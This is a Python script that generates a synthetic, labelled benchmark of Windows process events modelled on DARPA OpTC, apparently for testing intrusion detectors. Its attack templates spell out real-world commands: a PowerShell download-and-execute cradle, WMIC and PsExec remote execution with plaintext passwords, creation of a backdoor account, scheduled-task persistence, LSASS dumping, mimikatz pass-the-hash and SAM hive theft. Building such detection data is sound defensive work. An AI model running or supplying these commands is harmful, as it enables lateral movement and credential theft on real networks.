import os
import sys
import json
import random
import pandas as pd

def generate_optc_test_benchmark(output_path="data/optc_test_benchmark.csv", total_samples=1200):
    """
    Constructs a DARPA OpTC (Operationally Transparent Cyber) out-of-distribution 
    benchmark dataset based on the eCAR host event schema and OpTC Red Team engagement logs.
    
    Target Label Classes:
      0: Normal (Benign Enterprise Host Telemetry)
      1: EoRS (Exploitation of Remote Services / Lateral Movement)
      2: EoHT (Exploitation of Hashing Techniques / Credential Access)
    """
    print("=" * 70)
    print("   [DARPA OpTC] COMPILING OUT-OF-DISTRIBUTION BENCHMARK DATASET   ")
    print("=" * 70)
    
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    events = []
    
    # 1. DARPA OpTC Benign Enterprise Background Host Activity (Class 0)
    # Reflects OpTC Windows 10 endpoints (e.g. host-001 through host-500)
    optc_benign_templates = [
        # System & Service background processes
        {"Image": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "C:\\Windows\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p", "ParentImage": "C:\\Windows\\System32\\services.exe", "ParentCommandLine": "C:\\Windows\\system32\\services.exe", "User": "NT AUTHORITY\\LOCAL SERVICE"},
        {"Image": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "C:\\Windows\\system32\\svchost.exe -k NetworkService -p", "ParentImage": "C:\\Windows\\System32\\services.exe", "ParentCommandLine": "C:\\Windows\\system32\\services.exe", "User": "NT AUTHORITY\\NETWORK SERVICE"},
        {"Image": "C:\\Windows\\System32\\taskhostw.exe", "CommandLine": "taskhostw.exe {2227A56E-0000-0000-0000-000000000000}", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs", "User": "CORP\\emp_sarah"},
        {"Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "CommandLine": "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p", "User": "CORP\\emp_david"},
        {"Image": "C:\\Windows\\System32\\conhost.exe", "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe", "User": "CORP\\emp_sarah"},
        {"Image": "C:\\Windows\\System32\\SearchProtocolHost.exe", "CommandLine": "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsO_SearchFilterHostProcess_Holder", "ParentImage": "C:\\Windows\\System32\\SearchIndexer.exe", "ParentCommandLine": "C:\\Windows\\system32\\SearchIndexer.exe /Embedding", "User": "NT AUTHORITY\\SYSTEM"},
        {"Image": "C:\\Windows\\System32\\smartscreen.exe", "CommandLine": "C:\\Windows\\System32\\smartscreen.exe -Embedding", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch", "User": "NT AUTHORITY\\SYSTEM"},
        {"Image": "C:\\Windows\\System32\\backgroundTaskHost.exe", "CommandLine": "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy77bc1", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch", "User": "CORP\\emp_david"},
        
        # User applications & normal administration
        {"Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"", "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "C:\\Windows\\Explorer.EXE", "User": "CORP\\emp_sarah"},
        {"Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --utility-sub-type=network.mojom.NetworkService", "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentCommandLine": "chrome.exe", "User": "CORP\\emp_sarah"},
        {"Image": "C:\\Windows\\System32\\ipconfig.exe", "CommandLine": "ipconfig.exe /flushdns", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe", "User": "CORP\\emp_admin"},
        {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net.exe view", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe", "User": "CORP\\emp_admin"},
        {"Image": "C:\\Windows\\System32\\gpupdate.exe", "CommandLine": "gpupdate.exe /target:computer /force", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs", "User": "NT AUTHORITY\\SYSTEM"},
        {"Image": "C:\\Windows\\System32\\sc.exe", "CommandLine": "sc.exe query LanmanServer", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe", "User": "CORP\\emp_admin"}
    ]
    
    # 2. DARPA OpTC Red Team Lateral Movement & Remote Services (Class 1: EoRS)
    # Reflects simulated adversary lateral movements recorded in OpTC eCAR events
    optc_eors_templates = [
        # WMI Remote Process Invocations
        {"Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "CommandLine": "wmic.exe /node:\"192.168.10.45\" /user:\"CORP\\domain_admin\" /password:\"Password123\" process call create \"powershell.exe -ep bypass -w hidden -enc JABjAGwAaQBlAG4AdAA...\"", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p", "User": "CORP\\domain_admin"},
        {"Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "CommandLine": "wmic.exe /node:192.168.10.102 process call create \"cmd.exe /c powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.200:8080/stage.ps1')\"", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch", "User": "NT AUTHORITY\\SYSTEM"},
        {"Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "CommandLine": "wmic.exe /node:192.168.10.88 process call create \"C:\\Windows\\Temp\\optc_agent.exe\"", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p", "User": "CORP\\svc_backup"},
        
        # Remote Service Spawning (PsExec / PaExec style remote services)
        {"Image": "C:\\Windows\\System32\\PSEXESVC.exe", "CommandLine": "C:\\Windows\\PSEXESVC.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "ParentCommandLine": "C:\\Windows\\system32\\services.exe", "User": "NT AUTHORITY\\SYSTEM"},
        {"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c \"C:\\Windows\\Temp\\psexec.exe \\\\host-104.corp.local -u CORP\\admin -p Pass123! -s cmd.exe /c whoami /all\"", "ParentImage": "C:\\Windows\\System32\\powershell.exe", "ParentCommandLine": "powershell.exe", "User": "CORP\\admin"},
        {"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "paexec.exe \\\\192.168.10.50 -u CORP\\Administrator -p Secret2020! -c C:\\Windows\\Temp\\payload.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe", "User": "CORP\\Administrator"},
        
        # WinRM / PowerShell Remoting
        {"Image": "C:\\Windows\\System32\\wsmprovhost.exe", "CommandLine": "C:\\Windows\\System32\\wsmprovhost.exe -Embedding", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p", "User": "CORP\\domain_admin"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Command -ComputerName host-205 -ScriptBlock { Start-Process cmd.exe -ArgumentList '/c net user /add attacker Pass123!' }\"", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe", "User": "CORP\\domain_admin"},
        
        # Remote Scheduled Tasks & DCOM abuse
        {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /create /s 192.168.10.33 /u CORP\\admin /p Password123 /sc ONSTART /tn \"OpTCSync\" /tr \"C:\\Windows\\Temp\\beacon.exe\" /ru \"NT AUTHORITY\\SYSTEM\"", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe", "User": "CORP\\admin"},
        {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /run /s 192.168.10.33 /tn \"OpTCSync\"", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe", "User": "CORP\\admin"}
    ]
    
    # 3. DARPA OpTC Red Team Credential Access & Pass-the-Hash (Class 2: EoHT)
    # Reflects credential extraction, LSASS memory dumping, and NTLM/hash reuse
    optc_eoht_templates = [
        # LSASS dumping via native DLLs (comsvcs.dll)
        {"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 580 C:\\Windows\\Temp\\lsass_optc.dmp full", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe", "User": "NT AUTHORITY\\SYSTEM"},
        {"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe comsvcs.dll, #24 644 C:\\ProgramData\\dump.bin full", "ParentImage": "C:\\Windows\\System32\\powershell.exe", "ParentCommandLine": "powershell.exe", "User": "NT AUTHORITY\\SYSTEM"},
        
        # Pass-the-Hash / Overpass-the-Hash / Mimikatz / Sekurlsa
        {"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:CORP /ntlm:329153f560eb329c0e1deea55e88a1e9 /run:cmd.exe\" exit", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe", "User": "CORP\\admin"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -ep bypass -c \"Import-Module .\\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'\"", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe", "User": "CORP\\admin"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -ep bypass -c \"[System.Convert]::FromBase64String('...mimikatz_payload...'); Invoke-WmiMethod -Path Win32_Process -Name Create -ArgumentList 'C:\\Windows\\Temp\\mimi.exe'\"", "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "explorer.exe", "User": "CORP\\admin"},
        
        # SAM & SECURITY registry hive dumping
        {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.save /y", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe", "User": "NT AUTHORITY\\SYSTEM"},
        {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save /y", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe", "User": "NT AUTHORITY\\SYSTEM"},
        
        # Remote Admin Shares & IPC traversal using harvested credentials
        {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net.exe use \\\\192.168.10.15\\ADMIN$ /u:CORP\\Administrator Password2020!", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe", "User": "CORP\\admin"},
        {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net.exe use \\\\192.168.10.22\\C$ /user:domain_admin 329153f560eb329c0e1deea55e88a1e9", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe", "User": "CORP\\admin"}
    ]
    
    # Target distribution: ~600 Benign (50%), ~300 EoRS (25%), ~300 EoHT (25%)
    num_benign = int(total_samples * 0.50)
    num_eors = int(total_samples * 0.25)
    num_eoht = int(total_samples * 0.25)
    
    print(f"[*] Synthesizing {total_samples} test events (Benign: {num_benign}, EoRS: {num_eors}, EoHT: {num_eoht})...")
    
    for i in range(num_benign):
        tmpl = optc_benign_templates[i % len(optc_benign_templates)]
        events.append({
            'EventID': 1,
            'Image': tmpl['Image'],
            'CommandLine': tmpl['CommandLine'],
            'ParentImage': tmpl['ParentImage'],
            'ParentCommandLine': tmpl['ParentCommandLine'],
            'User': tmpl['User'],
            'Label': 'Normal'
        })
        
    for i in range(num_eors):
        tmpl = optc_eors_templates[i % len(optc_eors_templates)]
        events.append({
            'EventID': 1,
            'Image': tmpl['Image'],
            'CommandLine': tmpl['CommandLine'],
            'ParentImage': tmpl['ParentImage'],
            'ParentCommandLine': tmpl['ParentCommandLine'],
            'User': tmpl['User'],
            'Label': 'EoRS'
        })
        
    for i in range(num_eoht):
        tmpl = optc_eoht_templates[i % len(optc_eoht_templates)]
        events.append({
            'EventID': 1,
            'Image': tmpl['Image'],
            'CommandLine': tmpl['CommandLine'],
            'ParentImage': tmpl['ParentImage'],
            'ParentCommandLine': tmpl['ParentCommandLine'],
            'User': tmpl['User'],
            'Label': 'EoHT'
        })
        
    random.seed(42)
    random.shuffle(events)
    
    df = pd.DataFrame(events)
    df.to_csv(output_path, index=False)
    print(f"[+] Successfully saved OpTC benchmark dataset to: {output_path} ({len(df):,} records)")
    print(f"[+] Class distribution:\n{df['Label'].value_counts()}")
    return output_path

if __name__ == "__main__":
    generate_optc_test_benchmark()
